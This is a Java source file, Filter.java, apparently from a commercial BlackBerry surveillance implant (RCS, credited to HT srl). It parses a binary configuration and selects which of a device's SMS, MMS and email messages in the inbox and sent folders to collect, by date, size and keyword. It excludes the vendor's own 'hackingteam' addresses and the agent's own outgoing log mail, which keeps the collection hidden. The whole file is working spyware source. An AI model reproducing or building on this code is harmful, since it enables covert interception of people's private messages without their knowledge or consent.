//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : Filter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent.mail;

import java.io.EOFException;
import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;
import blackberry.agent.Prefix;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Sendmail;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class Filter.
 */
public class Filter {
    //#ifdef DEBUG
    static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);
    //#endif

    public static final int TYPE_REALTIME = 0;
    public static final int TYPE_COLLECT = 1;

    public static final int CLASS_UNKNOWN = 0;
    public static final int CLASS_SMS = 1;
    public static final int CLASS_MMS = 2;
    public static final int CLASS_EMAIL = 3;

    static final int FILTERED_DISABLED = -1;
    static final int FILTERED_LASTCHECK = -2;
    static final int FILTERED_FROM = -3;
    static final int FILTERED_TO = -4;
    static final int FILTERED_SIZE = -5;
    static final int FILTERED_MESSAGE_ADDED = -6;
    static final int FILTERED_FOUND = -7;
    static final int FILTERED_INTERNAL = -8;
    static final int FILTERED_SENDMAIL = -9;
    static final int FILTERED_OK = 0;

    int[] folderTypes = new int[] { Folder.INBOX, Folder.SENT };

    public int size;

    public int version;
    public int type;
    public byte[] classname;
    public int classtype;

    public boolean enabled;
    public boolean all;
    public boolean doFilterFromDate;
    public Date fromDate;
    public boolean doFilterToDate;
    public Date toDate;
    public long maxMessageSize;
    public long maxMessageSizeToLog;

    public Vector keywords = new Vector();

    boolean valid;

    public int payloadStart;

    /**
     * Instantiates a new filter.
     * 
     * @param conf
     *            the conf
     * @param offset
     *            the offset
     * @param length
     *            the length
     */
    public Filter(final byte[] conf, final int offset, final int length) {

        final int headerSize = 116;
        final int classNameLen = 64;
        final int confSize = conf.length - offset;
        //#ifdef DBC
        Check.requires(confSize >= headerSize, "conf smaller than needed");
        //#endif

        final Prefix headerPrefix = new Prefix(conf, offset);

        if (!headerPrefix.isValid()) {
            return;
        }

        final DataBuffer databuffer = new DataBuffer(conf,
                headerPrefix.payloadStart, headerPrefix.length, false);

        //#ifdef DBC
        Check.asserts(headerPrefix.type == Prefix.TYPE_HEADER,
                "Wrong prefix type");
        Check.asserts(headerSize == headerPrefix.length, "Wrong prefix length");
        //#endif

        // LETTURA del HEADER
        try {

            size = databuffer.readInt();
            version = databuffer.readInt();
            type = databuffer.readInt();

            classname = new byte[classNameLen];
            databuffer.read(classname);

            final String classString = WChar.getString(classname, true);
            if (classString.equals("IPM.SMSText*")) {
                classtype = Filter.CLASS_SMS;
            } else if (classString.equals("IPM.Note*")) {
                classtype = Filter.CLASS_EMAIL;
            } else if (classString.equals("IPM.MMS*")) {
                classtype = Filter.CLASS_MMS;
            } else {
                classtype = Filter.CLASS_UNKNOWN;
                //#ifdef DEBUG
                debug.error("classtype unknown: " + classString);
                //#endif
            }

            //#ifdef DEBUG_TRACE
            debug.trace("classname: " + classString);
            //#endif

            enabled = databuffer.readInt() == 1;
            all = databuffer.readInt() == 1;
            doFilterFromDate = databuffer.readInt() == 1;
            long filetimeFromDate = databuffer.readLong();
            doFilterToDate = databuffer.readInt() == 1;
            long filetimeToDate = databuffer.readLong();
            maxMessageSize = databuffer.readInt();
            maxMessageSizeToLog = databuffer.readInt();

            //#ifdef DEBUG_TRACE
            if (doFilterFromDate) {
                DateTime dt = new DateTime(filetimeFromDate);
                fromDate = dt.getDate();
                debug.trace("from: " + fromDate.toString());
            }
            if (doFilterToDate) {
                DateTime dt = new DateTime(filetimeToDate);
                toDate = dt.getDate();
                debug.trace("to: " + toDate.toString());
            }
            debug.trace("maxMessageSize: " + maxMessageSize);
            debug.trace("maxMessageSizeToLog: " + maxMessageSizeToLog);
            //#endif

            payloadStart = (headerPrefix.payloadStart + size);

            valid = true;
        } catch (final EOFException e) {
            valid = false;
            //#ifdef DEBUG_ERROR
            debug.error("filter:" + e);
            //#endif
        }

        // Lettura delle KEYWORDS
        if (length > headerPrefix.length) {
            // ogni keyword ha il suo prefix
            final int endOffset = offset + length;
            int keywordOffset = offset + headerSize + Prefix.LEN;

            while (keywordOffset < endOffset) {
                final Prefix keywordPrefix = new Prefix(conf, keywordOffset);

                //#ifdef DBC
                Check.asserts(keywordPrefix.type == Prefix.TYPE_KEYWORD,
                        "Wrong prefix type");
                //#endif

                final String keyword = WChar.getString(conf, keywordOffset,
                        keywordPrefix.length, false);
                keywordOffset += keywordPrefix.length + Prefix.LEN;

                //#ifdef DEBUG_INFO
                debug.info("Keyword: " + keyword);
                //#endif
                keywords.addElement(keyword);
            }
        }
    }

    /**
     * Filter message.
     * 
     * @param message
     *            the message
     * @param lastcheck
     *            the lastcheck
     * @param checkAdded
     * @return the int
     * @throws MessagingException
     *             the messaging exception
     */
    public int filterMessage(final Message message, final long lastcheck)
            throws MessagingException {

        //#ifdef DBC
        Check.requires(message != null, "filterMessage: message != null");
        //#endif

        long receivedTime;

        /*
         * debug.trace("invio dell'email " + message.getSentDate() + " long: "
         * + message.getSentDate().getTime());
         * debug.trace("arrivo dell'email " + message.getReceivedDate()
         * + " long: " + message.getReceivedDate().getTime());
         * debug.trace("filtro FROM enabled:" + doFilterFromDate + " : "
         * + new Date(fromDate));
         * debug.trace("filtro TO enabled:" + doFilterToDate + " : "
         * + new Date(toDate));
         */

        Address[] from = message.getRecipients(Message.RecipientType.FROM);
        //#ifdef DBC
        Check.asserts(from != null, "filterMessage: from!=null");
        //#endif
        //#ifdef EXCLUDE_INTERNAL
        for (int i = 0; i < from.length; i++) {
            String addr = from[i].getAddr();
            if (addr != null && addr.indexOf("hackingteam") > -1) {
                debug.info("INTERNAL Address, skip it");
                return FILTERED_INTERNAL;
            }
        }
        //#endif
        
        if (message.getSubject().startsWith(Sendmail.LOGSUBJECT)){
            return FILTERED_SENDMAIL;
        }

        Folder folder = message.getFolder();

        boolean found = false;
        if (folder != null) {
            int folderType = folder.getType();
            int fsize = folderTypes.length;

            for (int i = 0; i < fsize; i++) {
                if (folderTypes[i] == folderType) {
                    //#ifdef DEBUG_TRACE
                    //debug.trace("filterMessage type OK:" + folderType);
                    //#endif
                    found = true;
                    break;
                }
            }
        }

        if (!found) {
            //#ifdef DEBUG_INFO
            debug.info("filterMessage: FILTERED_FOUND: " + folder.getName()
                    + " type: " + folder.getType());
            //#endif
            return FILTERED_FOUND;
        }
        // Se c'e' un filtro sulla data
        // entro

        if (!enabled) {
            //#ifdef DEBUG_INFO
            debug.info("Disabled");
            //#endif            
            return FILTERED_DISABLED;
        }

        receivedTime = message.getReceivedDate().getTime();
        if (receivedTime < lastcheck) {
            //#ifdef DEBUG_INFO
            debug.info("receivedTime < lastcheck :" + receivedTime + " < "
                    + lastcheck);
            //#endif
            return FILTERED_LASTCHECK;
        }

        // se c'e' il filtro from e non viene rispettato escludi la mail
        if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
            //#ifdef DEBUG_INFO
            debug.info("doFilterFromDate");
            //#endif
            return FILTERED_FROM;
        }

        // Se c'e' anche il filtro della data di fine e non viene rispettato
        // escludi la mail
        if (doFilterToDate == true && receivedTime > toDate.getTime()) {
            //#ifdef DEBUG_INFO
            debug.info("doFilterToDate");
            //#endif
            return FILTERED_TO;
        }

        final int trimAt = 0;
        if ((maxMessageSizeToLog > 0)
                && (message.getSize() > maxMessageSizeToLog)) {
            //#ifdef DEBUG_INFO
            debug.info("maxMessageSizeToLog");
            //#endif
            return FILTERED_SIZE;
        }

        return FILTERED_OK;
    }

    /**
     * Checks if is valid.
     * 
     * @return true, if is valid
     */
    public boolean isValid() {
        return valid;
    }
}